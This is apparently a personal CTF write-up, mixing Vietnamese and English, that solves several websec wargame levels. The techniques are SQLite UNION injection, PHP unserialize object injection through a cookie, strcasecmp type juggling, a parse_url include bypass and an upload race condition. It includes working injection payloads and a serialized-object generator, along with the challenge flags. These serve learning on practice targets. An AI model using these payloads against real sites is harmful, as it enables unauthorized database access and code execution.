---
title: Writeup note for websec
date: 2026-03-24 3:49:00 +0700
tags: [web, ctf]

---

# Writeup note for websec  
 

The journy of conquer the Web sec path...

## LEVEL 01
![image](https://hackmd.io/_uploads/Sy6Y_uKQ-g.png)

Đầu tiên ta được cung cấp source code của website, ta thấy rằng mình có thể exploit SQL injection vì ``$injection`` đang đến trực tiếp từ input của chúng ta, không qua sử lý. 

``` php
class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}
```

Đầu tiên database này là sqlite3, và chúng ta biết rằng sqlite sẽ luôn tạo 1 table **schema_master** chứa thông tin object như table, index, view, trigger và object đó ở table nào và câu lệnh sql **CREATE** gốc.

(Trong hình là **sqlite_schema** (sqlite bản mới ra sau này) nhưng nó còn có tên khác là **sqlite_master**)
![image](https://hackmd.io/_uploads/BJzO9OYXZg.png)

``` sql
CREATE TABLE sqlite_schema(
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);
```

Đầu tiên ta xem có tbl_name nào trong bảng sqlite_schema, **GROUP_CONCAT** giúp gộp các value trong một cột lại

``` sql
-1 UNION SELECT NULL, GROUP_CONCAT(tbl_name)
FROM sqlite_master

```
Output ra chỉ có table **users** 
![image](https://hackmd.io/_uploads/BkvTAYYQbe.png)

từ đây ta biết đang có tồn tại 1 table tên **users**

Sau đó để xem users được tạo tự câu sql nào ta query

``` sql 
-1 UNION SELECT NULL,GROUP_CONCAT(sql) FROM sqlite_master WHERE tbl_name='users' --
```
![image](https://hackmd.io/_uploads/HJhoMqt7Wx.png)

Sau đó ta thử xem password và username có gì

``` sql
-1 UNION SELECT NULL,GROUP_CONCAT(password) FROM users
```
![image](https://hackmd.io/_uploads/Syj7w9F7be.png)

Flag đây rồi~

```
WEBSEC{Simple_SQLite_Injection}
```

## LEVEL 04

![image](https://hackmd.io/_uploads/Sy1IHTFX-g.png)

Đầu tiên thử nhập vào **id = 1** sau đó nó sẽ hiện **username** của id đó chính là **flag** gợi ý rằng có thể **password** của **username** này là **flag**.

Nhìn vào source code:

``` php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```
Ta thấy lỗ hổng ở chỗ đoạn sau obj lấy từ cookie unserialize không an toàn, ta sẽ chèn obj để sau khi deserialize query của ta được thực thi, bằng cách thay đổi `_COOKIE['leet_hax0r'])`. 
``` php
$sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}
```
Ta thấy có điều kiện check cookie này có hợp lệ hay không. Tuy nhiên điều kiện check này rất lỏng lẻo ta chỉ cần truyền obj (không phải array) là đều vượt qua đoạn này. 

Object mà ta tạo có mục đích giúp set **username** thành query để hiện **password** để khi gọi id = 1 của user **flag** nó sẽ hiện **password** thay vì **username**. Ngoài ra, lý do tôi biết bảng này tên **users** vì tôi đoán nó giống bài trước, nhưng nếu không phải tên đó thì ta làm tương tự bài trước cũng được. 
``` php
<?php
class SQL {
    public $query;
}

$o = new SQL();
$o->query = "SELECT GROUP_CONCAT(password) AS username FROM 'users'";

$payload = base64_encode(serialize($o));
echo $payload;
```

Sử dụng burp suite ta thấy ban đầu **cookie leet_hax0r** có giá trị

![image](https://hackmd.io/_uploads/BJO9hTtmbg.png)

Ta đổi thành object có giá trị:

![image](https://hackmd.io/_uploads/HJnhnTYQZg.png)


Ở web nó sẽ hiện **username** chính là kết quả của query mà ta vừa inject

![image](https://hackmd.io/_uploads/r1W-pTYXWg.png)


`WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`
## LEVEL 17
![image](https://hackmd.io/_uploads/r1Rj8P0SZe.png)
Overview the next challenge, as usual we're given the source.

``` html
<?php
include "flag.php";

function sleep_rand() { /* I wish php5 had random_int() */
        $range = 100000;
        $bytes = (int) (log($range, 2) / 8) + 1;
        do {  /* Side effect: more random cpu cycles wasted ;) */
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        } while ($rnd >= $range);
        usleep($rnd);
}
?>
<!DOCTYPE html>
<html>
<head>
        <title>#WebSec Level Seventeen</title>
        <link rel="stylesheet" href="../static/bootstrap.min.css" />
    <meta http-equiv="content-type" content="text/html;charset=UTF-16">
</head>
        <body>
                <div id="main">
                        <div class="container">
                                <div class="row">
                                        <h1>Level Seventeen <small> - Guessing is fun!</small></h1>
                                </div>
                                <div class="row">
                                        <p class="lead">
                    Can you guess the flag?  You can check the sources <a href="source.php">here</a>.
                                        </p>
                                </div>
                        </div>
                        <div class="container">
                            <div class="row">
                                <form class="form-inline" method='post'>
                                    <input name='flag' class='form-control' type='text' placeholder='Guessed flag'>
                                    <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
                                </form>
                            </div>
                        </div>
                        <?php
                        if (isset ($_POST['flag'])):
                            sleep_rand(); /* This makes timing-attack impractical. */
                        ?>
            <br>
                        <div class="container">
                            <div class="row">
                                <?php
                                if (! strcasecmp ($_POST['flag'], $flag))
                                    echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
                                else
                                    echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
                                ?>
                            </div>
                        </div>
                        <?php endif ?>
                </div>
        </body>
</html>
```

As first, I thought it would be a guessy challenge (as mention in the title) but the sleep_rand() seem to be unpredictable. I found out that `strcasecmp` is a function that will return **NULL** value if the input is not string type, for example `strcasecmp(array, string)`. 

So what does **NULL** really do in this case? It turns out that `!NULL === true` which will lead us to the flag without guessing anything.

Take a closer look at the vul code:

``` php
<?php
    if (! strcasecmp ($_POST['flag'], $flag)) <--- vul here
        echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
    else
        echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';?>
```
 
 About the payload, we might want to submit a array so I use BurpSuite to intercept and change the POST request. 
 ![image](https://hackmd.io/_uploads/r1WGKwRH-g.png)

The result:
![image](https://hackmd.io/_uploads/SkI7YwRrWx.png)

`WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}`

## LEVEL 25

![image](https://hackmd.io/_uploads/r1zkqybL-e.png)

As usual, we are given a source web. The description is telling us that there's a file name flag.txt. 

![image](https://hackmd.io/_uploads/HyP6Fk-I-g.png)

When look into the source code I focus on this part as the input of include isn't get sanitize.  
``` php
<?php
                  parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
                  foreach ($query as $k => $v) {
                      if (stripos($v, 'flag') !== false)
                          die('You are not allowed to get the flag, sorry :/');
                  }

                  include $_GET['page'] . '.txt';
                  ?>
```

The first thing I obversed is the fake sanitize process as we notice the source manually parse the url `parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query)` instead of using  `$_GET['page']` which might be the potential threat. 

`parse_url()` does not reliably handle malformed URIs. When I tried `///` instead of `/` it will fail and bypass the sanitize process. 

![image](https://hackmd.io/_uploads/SkyF03wIbl.png)


`WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}`

## LEVEL 28

The source is there as usual 

``` php
<?php
if(isset($_POST['submit'])) {
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }

  unlink($filename);
}
?>
```

The web allow us to upload a file and a checksum then it will check if it satisfy the condition. However, the problem is that the condition is unable to crack which mean it's a death end. 

``` php
  $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
```

After investigating, I noticed that what we uploaded will be save into the server which its path start with `./tmp/`. It's hard to think about this idea `Maybe the moment server store my files it will execute them` instead of that I tried to imagine  server will show a source web just like this, so now the php part might be easier to catch up. 

Now I hope that I've learn a new mindset. 

This is how it start first we uploaded a script through the file
![image](https://hackmd.io/_uploads/S13mkU6P-l.png)

![image](https://hackmd.io/_uploads/H1hORrTD-g.png)

Then at the same time we also try to open the our file's path so that the web php can be execute. 

The `tmp` folder won't be saved so we must do all of this during the process of checking. Luckily, we're able to reproduce this many times so yeah.
![image](https://hackmd.io/_uploads/SJO9RBTPZl.png)

`WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}`